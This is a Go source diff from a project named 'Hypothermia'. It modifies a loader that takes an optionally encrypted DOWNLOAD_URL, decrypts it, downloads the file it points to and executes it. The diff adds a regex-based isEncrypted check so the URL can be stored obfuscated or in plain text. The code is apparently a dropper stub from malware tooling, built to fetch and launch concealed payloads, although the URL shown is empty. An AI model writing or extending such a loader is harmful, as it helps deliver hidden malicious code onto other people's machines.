@@ -3,16 +3,21 @@ package main
 import (
 	"fmt"
 	"os/exec"
+	"regexp"
 	"syscall"
 
 	"Hypothermia/src/utils"
 	"Hypothermia/src/utils/crypto"
 )
 
-const DOWNLOAD_URL string = ""
+var DOWNLOAD_URL string = ""
 
 func main() {
-	path, err := utils.DonwloadFile(utils_crypto.DecryptBasic(DOWNLOAD_URL))
+	if isEncrypted(DOWNLOAD_URL) {
+		DOWNLOAD_URL = utils_crypto.DecryptBasic(DOWNLOAD_URL)
+	}
+
+	path, err := utils.DonwloadFile(DOWNLOAD_URL)
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -32,4 +37,17 @@ func main() {
 		fmt.Println("🟥 Failed to run")
 		return
 	}
+}
+
+func isEncrypted(data string) bool {
+	if len(data) == 0 {
+		return false
+	}
+
+	regex := regexp.MustCompile(`[a-zA-Z\.\-_]`)
+	if regex.MatchString(data) {
+		return false
+	}
+
+	return true
 }
